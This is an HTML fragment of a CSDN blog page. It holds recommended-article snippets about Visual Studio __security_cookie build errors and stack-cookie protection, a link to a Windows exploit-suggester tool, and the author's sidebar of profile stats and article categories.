					<a href="https://blog.csdn.net/encesu" target="_blank"><span class="blog-title"></span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">06-24</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					2025
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/encesu/article/details/93486200" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-15.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"15","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/encesu/article/details/93486200"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-15.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-15.control'>
				<div class="desc ellipsis-online ellipsis-online-1">__raise_<em>security</em>failure((EXCEPTION_POINTERS*)&amp;GS_ExceptionPointers);



__<em>security</em>_check_<em>cookie</em>





今天把框架程序编译长Release的时候，突然弹出这个错误

解决办法



VS2017 编译器，项目属性，C/C++ // 代码生成 //安全检查//禁止
...</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://dreamcode.blog.csdn.net/article/details/4457896"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"16","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://dreamcode.blog.csdn.net/article/details/4457896"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://dreamcode.blog.csdn.net/article/details/4457896" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"16","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://dreamcode.blog.csdn.net/article/details/4457896"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-16.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-16.control'>
					在vs2005中出现: error LNK2001: 无法解析的外部符号 __<em>security</em>_<em>cookie</em>现象的处理办法
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/Dreamcode" target="_blank"><span class="blog-title">Dreamcode ~ 区块链签章第一品牌</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">08-18</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					4150
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://dreamcode.blog.csdn.net/article/details/4457896" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"16","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://dreamcode.blog.csdn.net/article/details/4457896"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-16.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-16.control'>
				<div class="desc ellipsis-online ellipsis-online-1">两种方法：1. 加入代码：#if (_WIN32_WCE &lt; 0x0500)#pragma comment(lib, &quot;CCrtRtti.lib&quot;)#endif2.在 Property Page 的 C/C++ 设置中，把 Buffer Overflow Check 关闭。我倾向用这种方法。因为 CE 下的安全问题可以预见的时间内是不存在的。没必要每个函</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/caiqiiqi/article/details/73065300"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-17.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"17","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/caiqiiqi/article/details/73065300"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/caiqiiqi/article/details/73065300" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-17.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"17","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/caiqiiqi/article/details/73065300"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-17.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-17.control'>
					windows-<em>exploit</em>-suggester.py
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/caiqiiqi" target="_blank"><span class="blog-title">公众号shadow sock7</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">06-11</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					778
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/caiqiiqi/article/details/73065300" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-17.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"17","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/caiqiiqi/article/details/73065300"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-17.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-17.control'>
				<div class="desc ellipsis-online ellipsis-online-1">https://github.com/SecWiki/windows-kernel-<em>exploit</em>s/tree/master/win-exp-suggester视频： 
https://www.youtube.com/watch?v=6naFH9MQHy8</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/A_2276426950/article/details/109546042"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-18.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"18","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/A_2276426950/article/details/109546042"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/A_2276426950/article/details/109546042" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-18.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"18","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/A_2276426950/article/details/109546042"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-18.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-18.control'>
					___<em>security</em>_<em>cookie</em>机制，防止栈溢出
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/A_2276426950" target="_blank"><span class="blog-title">走在北风里</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">11-07</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					65
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/A_2276426950/article/details/109546042" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-18.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"18","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/A_2276426950/article/details/109546042"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-18.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-18.control'>
				<div class="desc ellipsis-online ellipsis-online-1">（转）___<em>security</em>_<em>cookie</em>机制，防止栈溢出
原文链接
从研究底层和汇编以来，已经多次接触到&ldquo;栈溢出&rdquo;这个名词了。
这次在汇编码中看到了个不明就里的 ___<em>security</em>_<em>cookie</em> ，查了下，原来是编译器的安全检查机制。转载一篇文章：
首先，<em>security</em> <em>cookie</em>并不是windows系统自带的保护机制，并不是说一个确实存在溢出漏洞的
程序，放到带<em>security</em> <em>cookie</em>保护的环境中，就不能正常溢出了。
那么，到底是什么是<em>security</em> <em>cookie</em>呢？
我觉得从广义上讲，</div>
			</a>
		</div>
	</div>
</div>
            </div>
            <div class="template-box">
                <span>©️2020 CSDN</span>
                <span>皮肤主题: 技术黑板</span>
                <span> 设计师:CSDN官方博客</span>
                <span>
                    <a href="https://blog.csdn.net/" class="back-home c-blue c-blue-hover c-blue-focus">返回首页</a>
                </span>
            </div>
<div class="blog-footer-bottom" style="margin-top:10px;"></div>
<script__ src="https://g.csdnimg.cn/common/csdn-footer/csdn-footer.js" data-isfootertrack="false" type="text/javascript"></script__>
<script__ type="text/javascript">
    window.csdn.csdnFooter.options = {
        el: '.blog-footer-bottom',
        type: 2
    }
</script__>        </main>
<aside class="blog_container_aside">
	<div id="asideProfile" class="aside-box">
    <div class="profile-intro d-flex">
        <div class="avatar-box d-flex justify-content-center flex-column">
            <a href="https://blog.csdn.net/dupei" data-report-click='{"mod":"popu_379","spm":"1001.2101.3001.4121","dest":"https://blog.csdn.net/dupei","ab":"new"}'>
                <img src="https://profile.csdnimg.cn/8/E/2/3_dupei" class="avatar_pic">
            </a>
        </div>
        <div class="user-info d-flex flex-column profile-intro-name-box">
            <div class="profile-intro-name-boxTop">
                <a href="https://blog.csdn.net/dupei" class="" id="uid" title="dupei" data-report-click='{"mod":"popu_379","spm":"1001.2101.3001.4122","dest":"https://blog.csdn.net/dupei","ab":"new"}'>
                    <span class="name " username="dupei">dupei</span>
                </a>
                <span>
                </span>
                <span class="flag expert-blog">
                <span class="bubble">CSDN认证博客专家</span>
                </span>
                <span class="flag company-blog">
                <span class="bubble">CSDN认证企业博客</span>
                </span>
            </div>
            <div class="profile-intro-name-boxFooter">
                <span class="personal-home-page personal-home-years">码龄13年</span>
                    <span class="personal-home-page">
                    <a class="personal-home-certification" href="https://i.csdn.net/#/uc/profile?utm_source=14998968" target="_blank" title="暂无认证">
                    <img src="https://csdnimg.cn/identity/nocErtification.png" alt="">
                    暂无认证
                    </a>
                    </span>
            </div>
        </div>
    </div>
    <div class="data-info d-flex item-tiling">
        <dl class="text-center" title="72">
            <a href="https://blog.csdn.net/dupei" data-report-click='{"mod":"1598321000_001","spm":"1001.2101.3001.4310"}' data-report-query="t=1">  
                <dt><span class="count">72</span></dt>
                <dd class="font">原创</dd>
            </a>
        </dl>
        <dl class="text-center" data-report-click='{"mod":"1598321000_002","spm":"1001.2101.3001.4311"}' title="31439">
            <a href="https://blog.csdn.net/rank/list/weekly" target="_blank">
                <dt><span class="count">3万+</span></dt>
                <dd class="font">周排名</dd>
            </a>
        </dl>
        <dl class="text-center" title="34042">
            <a href="https://blog.csdn.net/rank/list/total" data-report-click='{"mod":"1598321000_003","spm":"1001.2101.3001.4312"}' target="_blank">
                <dt><span class="count">3万+</span></dt>
                <dd class="font">总排名</dd>
            </a>
        </dl>
        <dl class="text-center" style="min-width:58px" title="293134">  
            <dt><span class="count">29万+</span></dt>
            <dd>访问</dd>
        </dl>
        <dl class="text-center" title="5级,点击查看等级说明">
            <dt><a href="https://blog.csdn.net/blogdevteam/article/details/103478461" target="_blank">
                <img class="level" src="https://csdnimg.cn/identity/blog5.png">
            </a>
            </dt>
            <dd>等级</dd>
        </dl>
    </div>
    <div class="item-rank"></div>
    <div class="data-info d-flex item-tiling">
        <dl class="text-center" title="3034">
            <dt><span class="count">3034</span></dt>
            <dd>积分</dd>
        </dl>
         <dl class="text-center" id="fanBox" title="39">
            <dt><span class="count" id="fan">39</span></dt>
            <dd>粉丝</dd>
        </dl>
        <dl class="text-center" title="17">
            <dt><span class="count">17</span></dt>
            <dd>获赞</dd>
        </dl>
        <dl class="text-center" title="26">
            <dt><span class="count">26</span></dt>
            <dd>评论</dd>
        </dl>
        <dl class="text-center" title="51">
            <dt><span class="count">51</span></dt>
            <dd>收藏</dd>
        </dl>
    </div>
    <div class="aside-box-footer" data-report-view='{"spm":"3001.4296"}'>
        <div class="badge-box d-flex">
            <div class="badge d-flex">
                <div class="icon-badge" title="持之以恒">
                    <div class="mouse-box">
                        <img class="medal-img" data-report-click='{"spm":"3001.4296"}' src="https://csdnimg.cn/medal/chizhiyiheng@240.png" alt="持之以恒">
                    </div>
                </div>
                <div class="icon-badge" title="勤写标兵Lv2">
                    <div class="mouse-box">
                        <img class="medal-img" data-report-click='{"spm":"3001.4296"}' src="https://csdnimg.cn/medal/qixiebiaobing2@240.png" alt="勤写标兵Lv2">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="profile-intro-name-boxOpration">
        <div class="opt-letter-watch-box">
        <a class="bt-button personal-letter" href="https://im.csdn.net/chat/dupei" target="_blank" rel="noopener">私信</a>
        </div>
        <div class="opt-letter-watch-box"> 
            <a class="personal-watch bt-button" id="btnAttent" >关注</a>  
        </div>
    </div>
</div>
<div id="asideSearchArticle" class="aside-box">
	<div class="aside-content search-comter">
    <div class="aside-search aside-search-blog">         
        <input type="text" class="input-serch-blog" name="" autocomplete="off" value="" id="search-blog-words" placeholder="搜博主文章">
        <a class="btn-search-blog">
                    <img src="//csdnimg.cn/cdn/content-toolbar/csdn-sou.png?v=1587021042">
        </a>
    </div>
    </div>
</div>


<div id="asideHotArticle" class="aside-box">
	<h3 class="aside-title">热门文章</h3>
	<div class="aside-content">
		<ul class="hotArticle-list">
			<li>
				<a href="https://blog.csdn.net/dupei/article/details/6016500" target="_blank"  data-report-click='{"mod":"popu_541","spm":"1001.2101.3001.4139","dest":"https://blog.csdn.net/dupei/article/details/6016500","ab":"new"}'>
				MSYS的下载与安装
					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					<span class="read">33583</span>
                </a>
			</li>
			<li>
				<a href="https://blog.csdn.net/dupei/article/details/6215381" target="_blank"  data-report-click='{"mod":"popu_541","spm":"1001.2101.3001.4139","dest":"https://blog.csdn.net/dupei/article/details/6215381","ab":"new"}'>
				CentOS配置本地yum源（使用镜像iso文件）
					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					<span class="read">31416</span>
                </a>
			</li>
			<li>
				<a href="https://blog.csdn.net/dupei/article/details/6014488" target="_blank"  data-report-click='{"mod":"popu_541","spm":"1001.2101.3001.4139","dest":"https://blog.csdn.net/dupei/article/details/6014488","ab":"new"}'>
				SQLAlchemy指南(tutorial)
					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					<span class="read">30341</span>
                </a>
			</li>
			<li>
				<a href="https://blog.csdn.net/dupei/article/details/6022396" target="_blank"  data-report-click='{"mod":"popu_541","spm":"1001.2101.3001.4139","dest":"https://blog.csdn.net/dupei/article/details/6022396","ab":"new"}'>
				【Python】Windows下安装MySQLdb遇到的问题及解决方法
					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					<span class="read">29612</span>
                </a>
			</li>
			<li>
				<a href="https://blog.csdn.net/dupei/article/details/6435856" target="_blank"  data-report-click='{"mod":"popu_541","spm":"1001.2101.3001.4139","dest":"https://blog.csdn.net/dupei/article/details/6435856","ab":"new"}'>
				在Eclipse下配置OpenCV(Windows平台)
					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					<span class="read">14307</span>
                </a>
			</li>
		</ul>
	</div>
</div>
<div id="asideCategory" class="aside-box flexible-box">
    <h3 class="aside-title">分类专栏</h3>
    <div class="aside-content">
        <ul>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_769978.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_769978.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">C++</span>
                    </span>
                    <span class="count float-right">4篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_10899309.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_10899309.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">容器</span>
                    </span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_10706335.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_10706335.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756780.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">Java</span>
                    </span>
                    <span class="count float-right">1篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9855590.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9855590.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756926.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">Deep Learning</span>
                    </span>
                    <span class="count float-right">6篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9426921.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9426921.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">学习笔记</span>
                    </span>
                    <span class="count float-right">12篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9563438.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9563438.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">Tensorflow</span>
                    </span>
                    <span class="count float-right">5篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9364486.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9364486.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">开发环境</span>
                    </span>
                    <span class="count float-right">4篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9800364.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9800364.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756925.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">Speech Recognition</span>
                    </span>
                    <span class="count float-right">5篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9426918.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9426918.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">GAN</span>
                    </span>
                    <span class="count float-right">8篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9580732.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9580732.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756919.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">mmdnn</span>
                    </span>
                    <span class="count float-right">1篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9579396.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9579396.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756757.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">docker</span>
                    </span>
                    <span class="count float-right">1篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9367884.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9367884.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756925.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">python</span>
                    </span>
                    <span class="count float-right">1篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9364546.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9364546.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">iOS</span>
                    </span>
                    <span class="count float-right">1篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9325021.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9325021.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">Android</span>
                    </span>
                    <span class="count float-right">2篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_773206.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_773206.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">Linux</span>
                    </span>
                    <span class="count float-right">17篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_791549.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_791549.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">MachineLearning</span>
                    </span>
                    <span class="count float-right">11篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_879039.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_879039.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756724.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">Security</span>
                    </span>
                    <span class="count float-right">4篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_6523929.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_6523929.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">杂项</span>
                    </span>
                    <span class="count float-right">8篇</span>
                </a>
            </li>
            <li class="">
                <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9245421.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9245421.html","ab":"new"}'>
                    <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                    <span class="title oneline">
                        <span class="text">逆向分析</span>
                    </span>
                    <span class="count float-right">3篇</span>
                </a>
            </li>
        </ul>
    </div>
    <p class="text-center">
        <a class="flexible-btn" data-fbox="aside-archive"><img class="look-more" src="https://csdnimg.cn/release/blogv2/dist/pc/img/arrowDownWhite.png" alt=""></a>
    </p>
</div>
<div id="asideNewComments" class="aside-box">
    <h3 class="aside-title">最新评论</h3>
    <div class="aside-content">
        <ul class="newcomment-list">
            <li>
